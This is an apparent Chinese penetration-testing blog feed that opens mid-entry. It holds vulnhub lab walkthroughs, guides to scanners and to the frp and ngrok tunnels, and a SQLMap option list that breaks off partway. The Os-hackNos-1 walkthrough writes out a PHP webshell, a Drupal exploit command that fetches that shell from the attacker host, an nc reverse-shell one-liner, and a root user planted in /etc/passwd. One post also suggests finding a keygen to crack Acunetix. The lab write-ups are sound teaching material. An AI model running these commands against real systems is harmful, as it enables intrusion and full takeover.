alt="文件包含/etc/passwd"></p><p>然后发现存在flag用户，使用john工具进行解密</p><h4 id="john解密"><a href="#john解密" class="headerlink" title="john解密"></a>john解密</h4><p><img src="https://cdnjson.com/images/2022/11/11/5.png" alt="john解密"></p><h4 id="ssh远程登陆"><a href="#ssh远程登陆" class="headerlink" title="ssh远程登陆"></a>ssh远程登陆</h4><p>然后使用ssh远程登陆，查看当前权限，发现权限比较低</p><p><img src="https://cdnjson.com/images/2022/11/11/7.png" alt="ssh登陆"></p><p>收集可用的信息，发现 /var/backups/passbkp/md5-hash 文件中有一个用户和密文，再次尝试使用john进行解密，成功破解密码，su切换用户登陆成功</p><hr><h3 id="0x003-查找flag"><a href="#0x003-查找flag" class="headerlink" title="0x003 查找flag"></a>0x003 查找flag</h3><hr><p><img src="https://cdnjson.com/images/2022/11/11/9.png" alt="flag1"></p><p>查看第二个flag的时候，发现拒绝访问，查看当前用户允许使用哪些命令，发现允许使用所有命令，直接sudo提权即可。</p><p><img src="https://cdnjson.com/images/2022/11/11/10.png" alt="sudo"></p><p><img src="https://cdnjson.com/images/2022/11/11/11.png" alt="flag2"></p>]]></content>
      
      
      <categories>
          
          <category> vulnhub </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web Security </tag>
            
            <tag> vulnhub </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>vulnhub靶场Os-hackNos-1</title>
      <link href="/2022/11/10/toc-heading-11/"/>
      <url>/2022/11/10/toc-heading-11/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h3 id="0x000-靶场描述"><a href="#0x000-靶场描述" class="headerlink" title="0x000 靶场描述"></a>0x000 靶场描述</h3><hr><p>难度：简单到中级<br>flag ： 2个flag 第一个用户和第二个root<br>学习：利用|网络应用程序|枚举|权限提升<br>网站 ： <a href="http://www.hacknos.com/">www.hackNos.com</a><br>邮件 ：<a href="mailto:contact@hackNos.com">contact@hackNos.com</a></p><hr><h3 id="0x001-靶场下载"><a href="#0x001-靶场下载" class="headerlink" title="0x001 靶场下载"></a>0x001 靶场下载</h3><hr><p><a href="https://www.vulnhub.com/entry/hacknos-os-hacknos,401/">https://www.vulnhub.com/entry/hacknos-os-hacknos,401/</a></p><hr><h3 id="0x002-信息收集"><a href="#0x002-信息收集" class="headerlink" title="0x002 信息收集"></a>0x002 信息收集</h3><hr><h4 id="探测存活主机"><a href="#探测存活主机" class="headerlink" title="探测存活主机"></a>探测存活主机</h4><p><code>netdiscover -r 192.168.43.0/24</code></p><p><img src="https://cdnjson.com/images/2022/11/10/1.png" alt="扫描存活主机"></p><h4 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h4><p><code>nmap -sS -sV -A -p 1-65535 192.168.43.55</code></p><p><img src="https://cdnjson.com/images/2022/11/10/2.png" alt="端口扫描"></p><p>发现开放了 22 和 80 端口，访问80端口，发现是一个ubuntu的默认静态页面，尝试访问robots.txt文件未果。。。</p><h4 id="目录扫描"><a href="#目录扫描" class="headerlink" title="目录扫描"></a>目录扫描</h4><p><code>dirsearch -u http://192.168.43.55</code></p><p>发现 <a href="http://192.168.43.55/drupal/">http://192.168.43.55/drupal/</a> 页面，尝试弱口令登陆，失败；继续进行目录扫描</p><p><img src="https://cdnjson.com/images/2022/11/10/4.png" alt="登陆页面"></p><blockquote><p>Drupal：是开源CMS之一，Drupal是CMS内容管理系统</p></blockquote><p><code>dirsearch -u http://192.168.43.55/drupal/</code></p><p><img src="https://cdnjson.com/images/2022/11/10/6.png" alt="目录扫描"></p><p>逐个访问进行查看，在 <a href="http://192.168.43.55/drupal/CHANGELOG.txt">http://192.168.43.55/drupal/CHANGELOG.txt</a> 页面发现了当前系统版本是7.57，搜索一下关于这个版本的漏洞，发现存在远程命令执行漏洞。</p><p>exp下载地址：<a href="https://github.com/pimps/CVE-2018-7600">https://github.com/pimps/CVE-2018-7600</a></p><hr><h3 id="0x003-利用CVE-2018-7600漏洞getshell"><a href="#0x003-利用CVE-2018-7600漏洞getshell" class="headerlink" title="0x003 利用CVE-2018-7600漏洞getshell"></a>0x003 利用CVE-2018-7600漏洞getshell</h3><hr><p>写一个一句话木马cmd.php</p><p><code>&lt;?php system($_POST[cmd]);?&gt;</code></p><p>kali开启http服务</p><p><code>python -m http.server 80</code></p><p>使用exp将木马文件远程下载到靶机</p><p><code>python drupa7-CVE-2018-7600.py http://192.168.43.55/drupal/ -c "wget http://192.168.43.253/cmd.php"</code></p><p><img src="https://cdnjson.com/images/2022/11/10/14.png" alt="命令执行"></p><p>然后burpsuite抓取cmd.php的包，改为POST</p><p>使用nc命令反弹一个shell</p><blockquote><p>这里为什么要反弹shell，而不直接用蚁剑连接的原因是：这里靶场对终端进行了限制，用蚁剑或者msf后面对提权操作有影响</p></blockquote><p><code>rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 192.168.43.55 8888 &gt;/tmp/f</code></p><p>通过URL编码将/、;、&gt; 编码为如下格式，否则会失败</p><p><code>rm+%2ftmp%2ff%3bmkfifo+%2ftmp%2ff%3bcat+%2ftmp%2ff%7c%2fbin%2fsh+-i+2%3e%261%7cnc+192.168.43.253+8888+%3e%2ftmp%2ff</code></p><p><img src="https://cdnjson.com/images/2022/11/10/10.png" alt="POST提交"></p><p>kali设置监听</p><p><code>nc -lvnp 8888</code></p><p>成功获取到shell，使用如下命令切换至交互模式</p><p><code>python3 -c 'import pty;pty.spawn("/bin/bash")'</code></p><p>查看当前权限，发现是www-data</p><hr><h3 id="0x004-权限提升"><a href="#0x004-权限提升" class="headerlink" title="0x004 权限提升"></a>0x004 权限提升</h3><hr><p>查看网站根目录，发现 alexander.txt 文件，查看文件内容，发现是一些密文，使用 base64解密后，发现还有一层加密，使用 <a href="https://www.splitbrain.org/services/ook">https://www.splitbrain.org/services/ook</a> 成功解密，发现是账号密码。</p><p><img src="https://cdnjson.com/images/2022/11/10/11.png" alt="base64解密"><br><img src="https://cdnjson.com/images/2022/11/10/9.png" alt="解密"></p><p>前面扫描到了22端口，现在又得到了账号和密码，感觉起飞了，然后ssh远程登陆，提示拒绝登陆；此路不通，重新找提权点。</p><p>尝试使用suid权限提权</p><p><code>find / -perm -u=s -type f 2&gt;/dev/null</code></p><p>发现 /etc/passwd 具有root权限，尝试替换passwd文件</p><p>kali制作passwd文件</p><p><code>perl -le 'print crypt("123456","addedsalt")'</code></p><p>将 <code>test:adrla7IBSfTZQ:0:0:root:/root:/bin/bash</code> 添加到 /etc/passwd 文件中</p><p>然后使用wget命令远程下载替换</p><p><code>wget http://192.168.43.253/passwd -O /etc/passwd</code></p><p>查看passwd文件，发现替换成功</p><p><img src="https://cdnjson.com/images/2022/11/10/13.png" alt="passwd文件"></p><p><code>su test</code></p><p>提权成功</p><hr><h3 id="0x005-查找flag"><a href="#0x005-查找flag" class="headerlink" title="0x005 查找flag"></a>0x005 查找flag</h3><hr><p><code>cat /home/james/user.txt</code></p><p><code>cat /root/root.txt</code></p><p><img src="https://cdnjson.com/images/2022/11/10/12.png" alt="flag"></p>]]></content>
      
      
      <categories>
          
          <category> vulnhub </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web Security </tag>
            
            <tag> vulnhub </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>漏洞扫描器</title>
      <link href="/2022/08/16/toc-heading-10/"/>
      <url>/2022/08/16/toc-heading-10/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h3 id="0x001-漏洞扫描工具"><a href="#0x001-漏洞扫描工具" class="headerlink" title="0x001 漏洞扫描工具"></a>0x001 漏洞扫描工具</h3><hr><h4 id="1-Nessus"><a href="#1-Nessus" class="headerlink" title="1. Nessus"></a>1. Nessus</h4><p>下载地址：<a href="https://www.tenable.com/downloads/nessus?loginAttempted=true">https://www.tenable.com/downloads/nessus?loginAttempted=true</a></p><p>安装过程可以查看文章：<a href="https://zhuanlan.zhihu.com/p/147239031?from_voters_page=true">https://zhuanlan.zhihu.com/p/147239031?from_voters_page=true</a></p><p><img src="https://s1.ax1x.com/2022/08/15/vd8lYd.jpg" alt="Nessus首页"></p><p>点击 new scan 新建扫描</p><p><img src="https://s1.ax1x.com/2022/08/15/vd8IpR.jpg" alt="新建扫描"></p><p>漏洞扫描，选择 Web Application Tests 即可</p><p><img src="https://s1.ax1x.com/2022/08/15/vdGS1I.jpg" alt="填写目标信息"></p><p>扫描选相关根据自己的实际情况填写，没有的话选择默认，点击扫描即可。</p><h4 id="2-Acunetix-WVS"><a href="#2-Acunetix-WVS" class="headerlink" title="2. Acunetix WVS"></a>2. Acunetix WVS</h4><p>Acunetix WVS是一个Web漏洞扫描器自动检查web应用程序。这个工具特别擅长扫描跨站点脚本漏洞，SQL注入、弱密码破解等。Acunetix用于测试你的网站，web应用程序是否安全，通过抓取和分析发现可能的SQL注入。通过测试，它可以列出详细报告，并据此加固web应用程序。</p><p>下载地址：<a href="https://www.acunetix.com/download/fullver14/">https://www.acunetix.com/download/fullver14/</a></p><p>官网下载的只有14天的体验时间，如果想下载永久版的可以在网上搜索注册机</p><p>安装过程可以查看文章：<a href="https://zhuanlan.zhihu.com/p/102570351">https://zhuanlan.zhihu.com/p/102570351</a></p><p>简单使用：</p><p>点击 targets–&gt;add target 添加目标</p><p><img src="https://s1.ax1x.com/2022/08/15/vdMzUs.jpg" alt="添加目标"></p><p>输入目标 IP ，Description（描述）可写可不写，点击保存。</p><p><img src="https://s1.ax1x.com/2022/08/15/vdQYad.jpg" alt="填写目标信息"></p><p>此处根据自己遇到的情况进行选择</p><p>对有账号和密码的网站进行扫描，此处可以打开 Site Login ，点击 new 。</p><p><img src="https://s1.ax1x.com/2022/08/15/vdQzLD.jpg" alt="添加网站账号和密码扫描"></p><p>此时，会访问目标 IP 并弹出一个 web 页面，然后输入账号和密码，确认扫描即可。</p><h4 id="3-goby"><a href="#3-goby" class="headerlink" title="3. goby"></a>3. goby</h4><p>下载地址：<a href="https://gobies.org/#dl">https://gobies.org/#dl</a></p><p>安装之后点击 Goby.exe 文件运行即可。</p><p>点击扫描，新建扫描任务</p><p><img src="https://s1.ax1x.com/2022/08/15/vd1F74.jpg" alt="新建扫描任务"></p><ul><li>IP/Domain：可以填写 IP 地址或者域名</li><li>Black IP：可以填写多 IP 段地址，如192.168.1.0/24 192.168.2.0/24</li><li>端口：根据自己的实际情况进行选择</li></ul><p>点击高级配置</p><p><img src="https://s1.ax1x.com/2022/08/15/vd1c3q.jpg" alt="高级配置"></p><p>可以选择自己想要的漏洞对目标进行检测。</p><h4 id="4-Burpsuite"><a href="#4-Burpsuite" class="headerlink" title="4. Burpsuite"></a>4. Burpsuite</h4><p>Burp Suite是一个平台，其中包含不同类型的工具，它们之间有许多接口，旨在促进和加速攻击应用程序的过程。所有这些工具共享相同的框架来显示和处理HTTP消息、身份验证、持久性、日志记录、警报、代理和可扩展性。</p><p>抓取目标网站的数据包</p><p><img src="https://s1.ax1x.com/2022/08/15/vdGo5Q.jpg" alt="抓包"></p><p>此时可以点击网站的每个页面，然后这些页面会在 Target 下面生成网站树</p><p><img src="https://s1.ax1x.com/2022/08/15/vdJS54.jpg" alt="网站树"></p><p>然后选中目标网站，点击右键，选择 scan–&gt;open scan launcher 新建扫描，items to scan 出现的内容就是你要扫描的目标</p><p><img src="https://s1.ax1x.com/2022/08/15/vdJaGj.jpg" alt="新建扫描"></p><p>点击 OK 即可开始扫描，扫描进度和结果会显示在 Dashboard</p><p><img src="https://s1.ax1x.com/2022/08/15/vdJ5sx.jpg" alt="扫描结果"></p><p>目前常用的就这几款扫描器，后面接触到了再进行更新。。。</p>]]></content>
      
      
      <categories>
          
          <category> pentest tools </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web Security </tag>
            
            <tag> tools </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>内网穿透神器</title>
      <link href="/2022/08/15/toc-heading-9/"/>
      <url>/2022/08/15/toc-heading-9/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h3 id="0x001-frp"><a href="#0x001-frp" class="headerlink" title="0x001 frp"></a>0x001 frp</h3><hr><h4 id="1-介绍"><a href="#1-介绍" class="headerlink" title="1. 介绍"></a>1. 介绍</h4><p>frp 是一个专注于内网穿透的高性能的反向代理应用，支持 TCP、UDP、HTTP、HTTPS 等多种协议。可以将内网服务以安全、便捷的方式通过具有公网 IP 节点的中转暴露到公网。</p><p>下载地址：<a href="https://github.com/fatedier/frp/releases">https://github.com/fatedier/frp/releases</a></p><h4 id="2-使用方法"><a href="#2-使用方法" class="headerlink" title="2. 使用方法"></a>2. 使用方法</h4><p>在具有公网 IP 的机器上部署 frps，修改 frps.ini 文件，这里使用了最简化的配置，设置了 frp 服务器用户接收客户端连接的端口：</p><pre class=" language-bash"><code class="language-bash"><span class="token punctuation">[</span>common<span class="token punctuation">]</span>bind_port <span class="token operator">=</span> 7000</code></pre><p>在需要被访问的内网机器上（SSH 服务通常监听在 22 端口）部署 frpc，修改 frpc.ini 文件，假设 frps 所在服务器的公网 IP 为 x.x.x.x：</p><pre class=" language-bash"><code class="language-bash"><span class="token punctuation">[</span>common<span class="token punctuation">]</span>server_addr <span class="token operator">=</span> x.x.x.xserver_port <span class="token operator">=</span> 7000<span class="token punctuation">[</span>ssh<span class="token punctuation">]</span><span class="token function">type</span> <span class="token operator">=</span> tcplocal_ip <span class="token operator">=</span> 127.0.0.1local_port <span class="token operator">=</span> 22remote_port <span class="token operator">=</span> 6000</code></pre><blockquote><p>local_ip 和 local_port 配置为本地需要暴露到公网的服务地址和端口。remote_port 表示在 frp 服务端监听的端口，访问此端口的流量将会被转发到本地服务对应的端口。</p></blockquote><p>分别启动 frps 和 frpc。</p><pre class=" language-bahs"><code class="language-bahs">服务端启动./frps -c ./frps.ini客户端启动./frpc -c ./frpc.ini</code></pre><h4 id="3-更多使用方法"><a href="#3-更多使用方法" class="headerlink" title="3. 更多使用方法"></a>3. 更多使用方法</h4><p><a href="https://frps.cn/11.html">frp官方文档介绍</a></p><hr><h3 id="0x002-ngrok"><a href="#0x002-ngrok" class="headerlink" title="0x002 ngrok"></a>0x002 ngrok</h3><hr><h4 id="1-介绍-1"><a href="#1-介绍-1" class="headerlink" title="1. 介绍"></a>1. 介绍</h4><p>Ngrok 是一个反向代理，通过在公共的端点和本地运行的 Web 服务器之间建立一个安全的通道。Ngrok 可捕获和分析所有通道上的流量，便于后期分析和重放。简单来说，利用 Ngrok 可以通过外网来访问部署在本地服务器的网站，它还提供一个 Web 管理页来监控 HTTP 通信报文，方便程序员发现问题、开发调试。另外 Ngrok 还支持 TCP 层端口映射，不局限于某一特定的服务。支持 Mac OS X，Linux，Windows 平台。</p><p>下载地址：<a href="http://ngrok.cn/download.html">http://ngrok.cn/download.html</a></p><h4 id="2-使用方法-1"><a href="#2-使用方法-1" class="headerlink" title="2. 使用方法"></a>2. 使用方法</h4><p>Windows：下载解压，然后双击运行 ngrok.exe 即可</p><p>Linux：下载使用 <code>unzip /path/to/ngrok.zip</code> 命令解压，然后输入  <code>./ngrok help</code> 命令运行即可。</p><p><strong>将本地Web服务器公开到互联网</strong></p><pre class=" language-bash"><code class="language-bash">ngrok.exe http 80</code></pre><blockquote><p>默认是将 80 端口公开到外网</p></blockquote><p>当您启动ngrok时，它将在您的终端中显示一个UI，其中包含您的隧道的公共URL以及有关通过您的隧道进行的连接的其他状态和指标信息。</p><pre class=" language-bash"><code class="language-bash">ngrok by @inconshreveable Tunnel Status                 onlineVersion                       2.0/2.0Web Interface                 http://127.0.0.1:4040Forwarding                    http://92832de0.ngrok.io -<span class="token operator">></span> localhost:80Forwarding                    https://92832de0.ngrok.io -<span class="token operator">></span> localhost:80 Connnections                  ttl     opn     rt1     rt5     p50     p90                              0       0       0.00    0.00    0.00    0.00</code></pre><p>此外，ngrok 还提供了一个实时的 Web UI，可以在其中内省您的隧道上运行的所有HTTP流量。只需要访问 <a href="http://localhost:4040/">http://localhost:4040</a> 即可检查请求详细信息。</p><p><img src="https://s1.ax1x.com/2022/08/15/vdZH3D.jpg" alt="查看请求信息"></p><p>重播请求</p><p>为外部API发出的webhooks开发通常会减慢你的开发周期，因为要求你做一些工作，比如拨打电话，触发挂钩请求。 ngrok允许您通过一次点击重新播放任何请求，大幅加快您的迭代周期。 单击Web检查UI上任何请求右上角的Replay按钮以重播。</p><p>请求正文验证</p><p>ngrok特别支持在网络上使用的最常见的数据交换格式。请求或响应正文中的任何XML或JSON数据会自动为您打印并检查语法错误。</p><p>更多高级功能请前往 <a href="https://dashboard.ngrok.com/signup">https://dashboard.ngrok.com/signup</a> 注册账号后使用</p><h4 id="3-更多使用方法-1"><a href="#3-更多使用方法-1" class="headerlink" title="3. 更多使用方法"></a>3. 更多使用方法</h4><p><a href="http://ngrok.cn/docs.html#expose">ngrok中文版文档</a></p>]]></content>
      
      
      <categories>
          
          <category> pentest tools </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web Security </tag>
            
            <tag> tools </tag>
            
            <tag> frp </tag>
            
            <tag> ngrok </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SQLMap入门</title>
      <link href="/2022/08/15/toc-heading-8/"/>
      <url>/2022/08/15/toc-heading-8/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h3 id="0x001-SQLMap-详解"><a href="#0x001-SQLMap-详解" class="headerlink" title="0x001 SQLMap 详解"></a>0x001 SQLMap 详解</h3><hr><p>SQLMap 是一个自动化的SQL注入工具，其主要功能是扫描、发现并利用给定URL的SQL注入漏洞，内置很多绕过插件，支持的数据库是MySQl、Oracle、PostgreSQL、Microsoft SQL Server、Microsoft Access、IBM DB2、SQLite、Firebird、Sybase和SAP MaxDB。SQLMap采用了一下5种SQL注入技术：</p><ul><li>基于布尔型的盲注，即可以根据返回页面判断条件真假的注入。</li><li>基于时间的盲注，即可以根据页面返回的时间长短判断条件真假的注入。</li><li>基于报错的注入，即页面会返回错误信息，或者把注入的语句直接输出到页面。</li><li>联合查询注入，在可以使用 union 的情况下使用</li><li>堆叠查询注入，可以同时执行多条语句的注入</li></ul><p>SQLMap 的强大功能包括数据库指纹识别、数据库枚举、数据提取、访问目标文件系统、并在获取完全的操作权限是实行任意命令。</p><hr><h3 id="0x002-SQLMap-入门"><a href="#0x002-SQLMap-入门" class="headerlink" title="0x002 SQLMap 入门"></a>0x002 SQLMap 入门</h3><hr><h4 id="1-安装-SQLMap"><a href="#1-安装-SQLMap" class="headerlink" title="1. 安装 SQLMap"></a>1. 安装 SQLMap</h4><p>SQLMap 的运行需要 python 环境（不支持 python3 ），所以需要先安装 python 环境，安装 python 之后将 python 的安装路径添加至环境变量即可。</p><p>Windows：在<a href="https://sqlmap.org/">SQLMap官网</a>下载安装即可；然后打开 cmd ，输入 <code>python sqlmap.py</code> 命令后工具即可正常运行。</p><p>Linux：<code>git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git sqlmap</code></p><h4 id="2-SQLMap-参数"><a href="#2-SQLMap-参数" class="headerlink" title="2. SQLMap 参数"></a>2. SQLMap 参数</h4><p><strong>选项：</strong></p><ul><li>-h, –help 显示基本帮助信息并退出</li><li>-hh 显示高级帮助信息并退出</li><li>–version 显示程序版本信息并退出</li><li>-v VERBOSE 输出信息详细程度级别：0-6（默认为 1）</li></ul><p><strong>目标：</strong></p><p>至少提供一个以下选项以指定目标</p><ul><li>-d DIRECT 直接连接数据库</li><li>-u URL, –url=URL 目标 URL（例如：”<a href="http://www.site.com/vuln.php?id=1&quot;%EF%BC%89">http://www.site.com/vuln.php?id=1"）</a></li><li>-l LOGFILE 从 Burp 或 WebScarab 代理的日志文件中解析目标地址</li><li>-x SITEMAPURL 从远程网站地图（.xml）文件中解析目标</li><li>-m BULKFILE 从文本文件中获取批量目标</li><li>-r REQUESTFILE 从文件中读取 HTTP 请求</li><li>-g GOOGLEDORK 使用 Google dork 结果作为目标</li><li>-c CONFIGFILE 从 INI 配置文件中加载选项</li></ul><p><strong>请求：</strong></p><p>以下选项可以指定连接目标地址的方式</p><ul><li>–method=METHOD 强制使用提供的 HTTP 方法（例如：PUT）</li><li>–data=DATA 使用 POST 发送数据串</li><li>–param-del=PARA.. 设置参数值分隔符</li><li>–cookie=COOKIE 指定 HTTP Cookie</li><li>–cookie-del=COO.. 设置 cookie 分隔符</li><li>–load-cookies=L.. 指定以 Netscape/wget 格式存放 cookies 的文件</li><li>–drop-set-cookie 忽略 HTTP 响应中的 Set-Cookie 参数</li><li>–user-agent=AGENT 指定 HTTP User-Agent</li><li>–random-agent 使用随机的 HTTP User-Agent</li><li>–host=HOST 指定 HTTP Host</li><li>–referer=REFERER 指定 HTTP Referer</li><li>-H HEADER, –hea.. 设置额外的 HTTP 头参数（例如：”X-Forwarded-For: 127.0.0.1”）</li><li>–headers=HEADERS 设置额外的 HTTP 头参数（例如：”Accept-Language: fr\nETag: 123”）</li><li>–auth-type=AUTH.. HTTP 认证方式（Basic，Digest，NTLM 或 PKI）</li><li>–auth-cred=AUTH.. HTTP 认证凭证（username:password）</li><li>–auth-file=AUTH.. HTTP 认证 PEM 证书/私钥文件</li><li>–ignore-code=IG.. 忽略 HTTP 错误码（例如：401）</li><li>–ignore-proxy 忽略系统默认代理设置</li><li>–ignore-redirects 忽略重定向尝试</li><li>–ignore-timeouts 忽略连接超时</li><li>–proxy=PROXY 使用代理连接目标 URL</li><li>–proxy-cred=PRO.. 使用代理进行认证（username:password）</li><li>–proxy-file=PRO.. 从文件中加载代理列表</li><li>–tor 使用 Tor 匿名网络</li><li>–tor-port=TORPORT 设置 Tor 代理端口代替默认端口</li><li>–tor-type=TORTYPE 设置 Tor 代理方式（HTTP，SOCKS4 或 SOCKS5（默认））</li><li>–check-tor 检查是否正确使用了 Tor</li><li>–delay=DELAY 设置每个 HTTP 请求的延迟秒数</li><li>–timeout=TIMEOUT 设置连接响应的有效秒数（默认为 30）</li><li>–retries=RETRIES 连接超时时重试次数（默认为 3）</li><li>–randomize=RPARAM 随机更改给定的参数值</li><li>–safe-url=SAFEURL 测试过程中可频繁访问且合法的 URL 地址（译者注：有些网站在你连续多次访问错误地址时会关闭会话连接，后面的“请求”小节有详细说明）</li><li>–safe-post=SAFE.. 使用 POST 方法发送合法的数据</li><li>–safe-req=SAFER.. 从文件中加载合法的 HTTP 请求</li><li>–safe-freq=SAFE.. 每访问两次给定的合法 URL 才发送一次测试请求</li><li>–skip-urlencode 不对 payload 数据进行 URL 编码</li><li>–csrf-token=CSR.. 设置网站用来反 CSRF 攻击的 token</li><li>–csrf-url=CSRFURL 指定可提取反 CSRF 攻击 token 的 URL</li><li>–force-ssl 强制使用 SSL/HTTPS</li><li>–hpp 使用 HTTP 参数污染攻击</li><li>–eval=EVALCODE 在发起请求前执行给定的 Python 代码（例如：”import hashlib;id2=hashlib.md5(id).hexdigest()”）</li></ul><p><strong>优化：</strong></p><p>以下选项用于优化 sqlmap 性能</p><ul><li>-o 开启所有优化开关</li><li>–predict-output 预测常用请求的输出</li><li>–keep-alive 使用持久的 HTTP(S) 连接</li><li>–null-connection 仅获取页面大小而非实际的 HTTP 响应</li><li>–threads=THREADS 设置 HTTP(S) 请求并发数最大值（默认为 1）</li></ul><p><strong>注入：</strong></p><p>以下选项用于指定要测试的参数，提供自定义注入 payloads 和篡改参数的脚本</p><ul><li>-p TESTPARAMETER 指定需要测试的参数</li><li>–skip=SKIP 指定要跳过的参数</li><li>–skip-static 指定跳过非动态参数</li><li>–param-exclude=.. 用正则表达式排除参数（例如：”ses”）</li><li>–dbms=DBMS 指定 DBMS 类型（例如：MySQL）</li><li>–dbms-cred=DBMS.. DBMS 认证凭据（username:password）</li><li>–os=OS 指定 DBMS 服务器的操作系统类型</li><li>–invalid-bignum 将无效值设置为大数</li><li>–invalid-logical 对无效值使用逻辑运算</li><li>–invalid-string 对无效值使用随机字符串</li><li>–no-cast 关闭 payload 构造机制</li><li>–no-escape 关闭字符串转义机制</li><li>–prefix=PREFIX 注入 payload 的前缀字符串</li><li>–suffix=SUFFIX 注入 payload 的后缀字符串</li><li>–tamper=TAMPER 用给定脚本修改注入数据</li></ul><p><strong>检测：</strong></p><p>以下选项用于自定义检测方式</p><ul><li>–level=LEVEL 设置测试等级（1-5，默认为 1）</li><li>–risk=RISK 设置测试风险等级（1-3，默认为 1）</li><li>–string=STRING 用于确定查询结果为真时的字符串</li><li>–not-string=NOT.. 用于确定查询结果为假时的字符串</li><li>–regexp=REGEXP 用于确定查询结果为真时的正则表达式</li><li>–code=CODE 用于确定查询结果为真时的 HTTP 状态码</li><li>–text-only 只根据页面文本内容对比页面</li><li>–titles 只根据页面标题对比页面</li></ul><p><strong>技术：</strong><br>以下选项用于调整特定 SQL 注入技术的测试方法</p><ul><li>–technique=TECH 使用的 SQL 注入技术（默认为“BEUSTQ”）</li><li>B: Boolean-based blind SQL injection（布尔型盲注）</li><li>E: Error-based SQL injection（报错型注入）</li><li>U: UNION query SQL injection（联合查询注入）</li><li>S: Stacked queries SQL injection（堆查询注入）</li><li>T: Time-based blind SQL injection（时间型盲注）</li><li>Q: inline Query injection（内联查询注入）</li><li>–time-sec=TIMESEC 延迟 DBMS 的响应秒数（默认为 5）</li><li>–union-cols=UCOLS 设置联合查询注入测试的列数目范围</li><li>–union-char=UCHAR 用于暴力猜解列数的字符</li><li>–union-from=UFROM 设置联合查询注入 FROM 处用到的表</li><li>–dns-domain=DNS.. 设置用于 DNS 渗出攻击的域名（译者注：推荐阅读《在SQL注入中使用DNS获取数据》<a href="http://cb.drops.wiki/drops/tips-5283.html%EF%BC%8C%E5%9C%A8%E5%90%8E%E9%9D%A2%E7%9A%84%E2%80%9C%E6%8A%80%E6%9C%AF%E2%80%9D%E5%B0%8F%E8%8A%82%E4%B8%AD%E4%B9%9F%E6%9C%89%E7%9B%B8%E5%BA%94%E8%A7%A3%E9%87%8A%EF%BC%89">http://cb.drops.wiki/drops/tips-5283.html，在后面的“技术”小节中也有相应解释）</a></li><li>–second-order=S.. 设置二阶响应的结果显示页面的 URL（译者注：该选项用于二阶 SQL 注入）</li></ul><p><strong>指纹识别：</strong></p><ul><li>-f, –fingerprint 执行广泛的 DBMS 版本指纹识别</li></ul><p><strong>枚举：</strong></p><p>以下选项用于获取后端数据库管理系统的信息，结构和数据表中的数据。此外，还可以运行你输入的 SQL 语句</p><ul><li>-a, –all 获取所有信息、数据</li><li>-b, –banner 获取 DBMS banner</li><li>–current-user 获取 DBMS 当前用户</li><li>–current-db 获取 DBMS 当前数据库</li><li>–hostname 获取 DBMS 服务器的主机名</li><li>–is-dba 探测 DBMS 当前用户是否为 DBA（数据库管理员）</li><li>–users 枚举出 DBMS 所有用户</li><li>–passwords 枚举出 DBMS 所有用户的密码哈希</li><li>–privileges 枚举出 DBMS 所有用户特权级</li><li>–roles 枚举出 DBMS 所有用户角色</li><li>–dbs 枚举出 DBMS 所有数据库</li><li>–tables 枚举出 DBMS 数据库中的所有表</li><li>–columns 枚举出 DBMS 表中的所有列</li><li>–schema 枚举出 DBMS 所有模式</li><li>–count 获取数据表数目</li><li>–dump 导出 DBMS 数据库表项</li><li>–dump-all 导出所有 DBMS 数据库表项</li><li>–search 搜索列，表和/或数据库名</li><li>–comments 获取 DBMS 注释</li><li>-D DB 指定要枚举的 DBMS 数据库</li><li>-T TBL 指定要枚举的 DBMS 数据表</li><li>-C COL 指定要枚举的 DBMS 数据列</li><li>-X EXCLUDECOL 指定要排除的 DBMS 数据列</li><li>-U USER 指定枚举的 DBMS 用户</li><li>–exclude-sysdbs 枚举所有数据表时，指定排除特定系统数据库</li><li>–pivot-column=P.. 指定主列</li><li>–where=DUMPWHERE 在转储表时使用 WHERE 条件语句</li><li>–start=LIMITSTART 指定要导出的数据表条目开始行数</li><li>–stop=LIMITSTOP 指定要导出的数据表条目结束行数</li><li>–first=FIRSTCHAR 指定获取返回查询结果的开始字符位</li><li>–last=LASTCHAR 指定获取返回查询结果的结束字符位</li><li>–sql-query=QUERY 指定要执行的 SQL 语句</li><li>–sql-shell 调出交互式 SQL shell</li><li>–sql-file=SQLFILE 执行文件中的 SQL 语句</li></ul><p><strong>暴力破解：</strong></p><ul><li>–common-tables 检测常见的表名是否存在</li><li>–common-columns 检测常用的列名是否存在</li></ul><p><strong>用户自定义函数注入：</strong></p><ul><li>–udf-inject 注入用户自定义函数</li><li>–shared-lib=SHLIB 共享库的本地路径</li></ul><p><strong>访问文件系统：</strong></p><p>以下选项用于访问后端数据库管理系统的底层文件系统</p><ul><li>–file-read=RFILE 读取后端 DBMS 文件系统中的文件</li><li>–file-write=WFILE 写入后端 DBMS 文件系统中的文件</li><li>–file-dest=DFILE 使用文件绝对路径写入到后端 DBMS</li></ul><p><strong>访问操作系统：</strong></p><p>以下选项用于访问后端数据库管理系统的底层操作系统</p><ul><li>–os-cmd=OSCMD 